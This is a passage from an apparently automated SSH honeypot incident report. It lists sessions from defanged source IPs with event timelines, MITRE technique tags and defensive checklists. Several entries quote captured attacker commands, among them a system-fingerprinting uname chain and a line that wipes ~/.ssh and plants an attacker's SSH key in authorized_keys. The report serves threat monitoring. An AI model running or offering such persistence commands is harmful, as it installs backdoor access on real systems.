| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:13:58` | `cowrie.session.connect` |
| `2026-07-29 10:14:00` | `cowrie.client.version` |
| `2026-07-29 10:14:00` | `cowrie.client.kex` |
| `2026-07-29 10:14:07` | `cowrie.login.success` |
| `2026-07-29 10:14:09` | `cowrie.session.params` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.success` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:09` | `cowrie.command.input` |
| `2026-07-29 10:14:10` | `cowrie.log.closed` |
| `2026-07-29 10:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1391e8d6799

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-07-29 10:15 |
| **Last Seen** | 2026-07-29 10:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:15:16` | `cowrie.session.connect` |
| `2026-07-29 10:15:16` | `cowrie.client.version` |
| `2026-07-29 10:15:16` | `cowrie.client.kex` |
| `2026-07-29 10:15:17` | `cowrie.login.success` |
| `2026-07-29 10:15:18` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-982198d4d227

| Field | Detail |
|---|---|
| **Source IP** | `90.230.168[.]26` |
| **First Seen** | 2026-07-29 10:15 |
| **Last Seen** | 2026-07-29 10:15 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:15:29` | `cowrie.session.connect` |
| `2026-07-29 10:15:30` | `cowrie.client.version` |
| `2026-07-29 10:15:30` | `cowrie.client.kex` |
| `2026-07-29 10:15:31` | `cowrie.login.success` |
| `2026-07-29 10:15:31` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.230.168[.]26` to AbuseIPDB if not already reported
- [ ] Block `90.230.168[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e1c49863ccf

| Field | Detail |
|---|---|
| **Source IP** | `218.94.115[.]164` |
| **First Seen** | 2026-07-29 10:15 |
| **Last Seen** | 2026-07-29 10:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:15:36` | `cowrie.session.connect` |
| `2026-07-29 10:15:37` | `cowrie.client.version` |
| `2026-07-29 10:15:37` | `cowrie.client.kex` |
| `2026-07-29 10:15:40` | `cowrie.login.success` |
| `2026-07-29 10:15:41` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.94.115[.]164` to AbuseIPDB if not already reported
- [ ] Block `218.94.115[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675389a85100

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-07-29 10:15 |
| **Last Seen** | 2026-07-29 10:15 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:15:40` | `cowrie.session.connect` |
| `2026-07-29 10:15:42` | `cowrie.client.version` |
| `2026-07-29 10:15:42` | `cowrie.client.kex` |
| `2026-07-29 10:15:53` | `cowrie.login.success` |
| `2026-07-29 10:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3622d8de37c7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:16 |
| **Last Seen** | 2026-07-29 10:16 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:16:11` | `cowrie.session.connect` |
| `2026-07-29 10:16:14` | `cowrie.client.version` |
| `2026-07-29 10:16:14` | `cowrie.client.kex` |
| `2026-07-29 10:16:34` | `cowrie.login.success` |
| `2026-07-29 10:16:38` | `cowrie.session.params` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.success` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:38` | `cowrie.command.input` |
| `2026-07-29 10:16:39` | `cowrie.log.closed` |
| `2026-07-29 10:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45f22ca7c223

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-29 10:18 |
| **Last Seen** | 2026-07-29 10:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:18:27` | `cowrie.session.connect` |
| `2026-07-29 10:18:28` | `cowrie.client.version` |
| `2026-07-29 10:18:28` | `cowrie.client.kex` |
| `2026-07-29 10:18:33` | `cowrie.login.success` |
| `2026-07-29 10:18:35` | `cowrie.session.params` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.success` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:35` | `cowrie.command.input` |
| `2026-07-29 10:18:36` | `cowrie.log.closed` |
| `2026-07-29 10:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe6aa9fc9c13

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-29 10:18 |
| **Last Seen** | 2026-07-29 10:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:18:34` | `cowrie.session.connect` |
| `2026-07-29 10:18:34` | `cowrie.client.version` |
| `2026-07-29 10:18:34` | `cowrie.client.kex` |
| `2026-07-29 10:18:35` | `cowrie.login.success` |
| `2026-07-29 10:18:35` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:18:35` | `cowrie.direct-tcpip.data` |
| `2026-07-29 10:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c1eef9b3bdc

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-29 10:20 |
| **Last Seen** | 2026-07-29 10:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:20:50` | `cowrie.session.connect` |
| `2026-07-29 10:20:51` | `cowrie.client.version` |
| `2026-07-29 10:20:51` | `cowrie.client.kex` |
| `2026-07-29 10:20:53` | `cowrie.login.success` |
| `2026-07-29 10:20:54` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:20:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2026e8f2acbf

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-07-29 10:21 |
| **Last Seen** | 2026-07-29 10:21 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:21:05` | `cowrie.session.connect` |
| `2026-07-29 10:21:06` | `cowrie.client.version` |
| `2026-07-29 10:21:06` | `cowrie.client.kex` |
| `2026-07-29 10:21:10` | `cowrie.login.success` |
| `2026-07-29 10:21:11` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d63a4354317

| Field | Detail |
|---|---|
| **Source IP** | `137.184.228[.]138` |
| **First Seen** | 2026-07-29 10:24 |
| **Last Seen** | 2026-07-29 10:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:24:11` | `cowrie.session.connect` |
| `2026-07-29 10:24:11` | `cowrie.client.version` |
| `2026-07-29 10:24:11` | `cowrie.client.kex` |
| `2026-07-29 10:24:12` | `cowrie.login.success` |
| `2026-07-29 10:24:12` | `cowrie.session.params` |
| `2026-07-29 10:24:12` | `cowrie.command.input` |
| `2026-07-29 10:24:12` | `cowrie.command.failed` |
| `2026-07-29 10:24:12` | `cowrie.log.closed` |
| `2026-07-29 10:24:13` | `cowrie.session.params` |
| `2026-07-29 10:24:13` | `cowrie.command.input` |
| `2026-07-29 10:24:13` | `cowrie.session.file_download` |
| `2026-07-29 10:24:13` | `cowrie.log.closed` |
| `2026-07-29 10:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.228[.]138` to AbuseIPDB if not already reported
- [ ] Block `137.184.228[.]138` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59a4d0386b93

| Field | Detail |
|---|---|
| **Source IP** | `137.184.228[.]138` |
| **First Seen** | 2026-07-29 10:24 |
| **Last Seen** | 2026-07-29 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:24:13` | `cowrie.session.connect` |
| `2026-07-29 10:24:13` | `cowrie.client.version` |
| `2026-07-29 10:24:13` | `cowrie.client.kex` |
| `2026-07-29 10:24:14` | `cowrie.login.success` |
| `2026-07-29 10:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.228[.]138` to AbuseIPDB if not already reported
- [ ] Block `137.184.228[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0aa6e35c1d

| Field | Detail |
|---|---|
| **Source IP** | `137.184.228[.]138` |
| **First Seen** | 2026-07-29 10:24 |
| **Last Seen** | 2026-07-29 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:24:14` | `cowrie.session.connect` |
| `2026-07-29 10:24:14` | `cowrie.client.version` |
| `2026-07-29 10:24:14` | `cowrie.client.kex` |
| `2026-07-29 10:24:14` | `cowrie.login.success` |
| `2026-07-29 10:24:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.228[.]138` to AbuseIPDB if not already reported
- [ ] Block `137.184.228[.]138` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52c72cef8644

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-29 10:24 |
| **Last Seen** | 2026-07-29 10:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:24:44` | `cowrie.session.connect` |
| `2026-07-29 10:24:44` | `cowrie.client.version` |
| `2026-07-29 10:24:44` | `cowrie.client.kex` |
| `2026-07-29 10:24:44` | `cowrie.login.success` |
| `2026-07-29 10:24:45` | `cowrie.session.params` |
| `2026-07-29 10:24:45` | `cowrie.command.input` |
| `2026-07-29 10:24:45` | `cowrie.command.failed` |
| `2026-07-29 10:24:45` | `cowrie.log.closed` |
| `2026-07-29 10:24:46` | `cowrie.session.params` |
| `2026-07-29 10:24:46` | `cowrie.command.input` |
| `2026-07-29 10:24:46` | `cowrie.session.file_download` |
| `2026-07-29 10:24:46` | `cowrie.log.closed` |
| `2026-07-29 10:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ae3d12d9e77

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-29 10:24 |
| **Last Seen** | 2026-07-29 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:24:47` | `cowrie.session.connect` |
| `2026-07-29 10:24:47` | `cowrie.client.version` |
| `2026-07-29 10:24:47` | `cowrie.client.kex` |
| `2026-07-29 10:24:47` | `cowrie.login.success` |
| `2026-07-29 10:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8ade2aadd30

| Field | Detail |
|---|---|
| **Source IP** | `187.34.131[.]136` |
| **First Seen** | 2026-07-29 10:24 |
| **Last Seen** | 2026-07-29 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:24:48` | `cowrie.session.connect` |
| `2026-07-29 10:24:48` | `cowrie.client.version` |
| `2026-07-29 10:24:48` | `cowrie.client.kex` |
| `2026-07-29 10:24:48` | `cowrie.login.success` |
| `2026-07-29 10:24:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.34.131[.]136` to AbuseIPDB if not already reported
- [ ] Block `187.34.131[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c39b6d68bf

| Field | Detail |
|---|---|
| **Source IP** | `117.222.52[.]247` |
| **First Seen** | 2026-07-29 10:29 |
| **Last Seen** | 2026-07-29 10:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:29:24` | `cowrie.session.connect` |
| `2026-07-29 10:29:25` | `cowrie.client.version` |
| `2026-07-29 10:29:25` | `cowrie.client.kex` |
| `2026-07-29 10:29:27` | `cowrie.login.success` |
| `2026-07-29 10:29:27` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:29:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.52[.]247` to AbuseIPDB if not already reported
- [ ] Block `117.222.52[.]247` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0944b2470172

| Field | Detail |
|---|---|
| **Source IP** | `220.134.25[.]203` |
| **First Seen** | 2026-07-29 10:29 |
| **Last Seen** | 2026-07-29 10:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:29:33` | `cowrie.session.connect` |
| `2026-07-29 10:29:33` | `cowrie.client.version` |
| `2026-07-29 10:29:33` | `cowrie.client.kex` |
| `2026-07-29 10:29:35` | `cowrie.login.success` |
| `2026-07-29 10:29:36` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.134.25[.]203` to AbuseIPDB if not already reported
- [ ] Block `220.134.25[.]203` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-033860bc9f37

| Field | Detail |
|---|---|
| **Source IP** | `36.92.35[.]211` |
| **First Seen** | 2026-07-29 10:33 |
| **Last Seen** | 2026-07-29 10:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:33:39` | `cowrie.session.connect` |
| `2026-07-29 10:33:40` | `cowrie.client.version` |
| `2026-07-29 10:33:40` | `cowrie.client.kex` |
| `2026-07-29 10:33:43` | `cowrie.login.success` |
| `2026-07-29 10:33:43` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:33:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.92.35[.]211` to AbuseIPDB if not already reported
- [ ] Block `36.92.35[.]211` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2b7579ecafd

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]2` |
| **First Seen** | 2026-07-29 10:33 |
| **Last Seen** | 2026-07-29 10:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:33:52` | `cowrie.session.connect` |
| `2026-07-29 10:33:54` | `cowrie.client.version` |
| `2026-07-29 10:33:54` | `cowrie.client.kex` |
| `2026-07-29 10:33:56` | `cowrie.login.success` |
| `2026-07-29 10:33:57` | `cowrie.direct-tcpip.request` |
| `2026-07-29 10:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]2` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a703766cfaa8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 10:38 |
| **Last Seen** | 2026-07-29 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:38:34` | `cowrie.session.connect` |
| `2026-07-29 10:38:34` | `cowrie.client.version` |
| `2026-07-29 10:38:34` | `cowrie.client.kex` |
| `2026-07-29 10:38:34` | `cowrie.login.success` |
| `2026-07-29 10:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705421d9b5dd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 10:38 |
| **Last Seen** | 2026-07-29 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 10:38:34` | `cowrie.session.connect` |
| `2026-07-29 10:38:34` | `cowrie.client.version` |
| `2026-07-29 10:38:34` | `cowrie.client.kex` |
| `2026-07-29 10:38:34` | `cowrie.login.success` |
| `2026-07-29 10:38:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebce4e3fae34

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-29 10:38 |
| **Last Seen** | 2026-07-29 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
